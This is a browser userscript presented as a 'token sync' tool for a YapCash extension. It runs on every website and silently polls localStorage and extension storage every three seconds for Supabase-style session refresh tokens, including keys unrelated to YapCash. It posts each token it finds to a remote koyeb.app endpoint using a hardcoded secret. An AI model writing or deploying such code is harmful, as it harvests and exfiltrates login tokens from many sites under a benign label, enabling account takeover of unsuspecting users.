// ==UserScript==
// @name         YapCash 24/7 Automatic Live Token Sync
// @namespace    http://tampermonkey.net/
// @version      1.1
// @description  Automatically syncs YapCash Chrome Extension tokens live to Firebase Firestore Cloud DB 24/7
// @author       Antigravity
// @match        *://*/*
// @match        chrome-extension://*/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @run-at       document-idle
// ==UserScript==

(function () {
  'use strict';

  const KOYEB_URL = "https://positive-lorinda-agentdark-2768a4b2.koyeb.app/api/sync-token";
  const SYNC_SECRET = "yapcash_secret_2026";
  let lastSyncedToken = "";

  function dispatchTokenSync(refreshToken) {
    if (!refreshToken || refreshToken === lastSyncedToken) return;
    lastSyncedToken = refreshToken;

    console.log("⚡ [YapCash Sync] Auto-detecting live refresh token from Chrome Extension! Syncing to Cloud...");

    GM_xmlhttpRequest({
      method: "POST",
      url: KOYEB_URL,
      headers: {
        "Content-Type": "application/json",
        "x-sync-key": SYNC_SECRET
      },
      data: JSON.stringify({ refreshToken }),
      onload: function (response) {
        if (response.status === 200) {
          try {
            const res = JSON.parse(response.responseText);
            console.log(`✅ [YapCash Sync] Token successfully synced live to Firebase Firestore Cloud DB for ${res.accountId} (${res.email})!`);
          } catch (_) {
            console.log("✅ [YapCash Sync] Token successfully synced live to Firebase Firestore Cloud DB!");
          }
        }
      }
    });
  }

  function checkAndSyncToken() {
    // 1. Check chrome.storage.local if running in Chrome Extension environment
    if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
      try {
        chrome.storage.local.get(null, (data) => {
          let token = data.refreshToken || data.session?.refresh_token;
          if (!token && data["sb-gidoyrbvnffcwbzzweqb-auth-token"]) {
            try {
              const parsed = typeof data["sb-gidoyrbvnffcwbzzweqb-auth-token"] === "string"
                ? JSON.parse(data["sb-gidoyrbvnffcwbzzweqb-auth-token"])
                : data["sb-gidoyrbvnffcwbzzweqb-auth-token"];
              token = parsed.refresh_token || parsed.currentSession?.refresh_token;
            } catch (_) {}
          }
          if (token) dispatchTokenSync(token);
        });
      } catch (_) {}
    }

    // 2. Check localStorage for Supabase session tokens on web pages
    try {
      if (typeof localStorage !== "undefined") {
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (key && (key.includes("sb-") || key.includes("supabase") || key.includes("yapcash"))) {
            try {
              const val = localStorage.getItem(key);
              const parsed = JSON.parse(val);
              const token = parsed.refresh_token || parsed.currentSession?.refresh_token || parsed.session?.refresh_token;
              if (token) dispatchTokenSync(token);
            } catch (_) {}
          }
        }
      }
    } catch (_) {}
  }

  // Check every 3 seconds silently in background
  setInterval(checkAndSyncToken, 3000);
  checkAndSyncToken();
})();
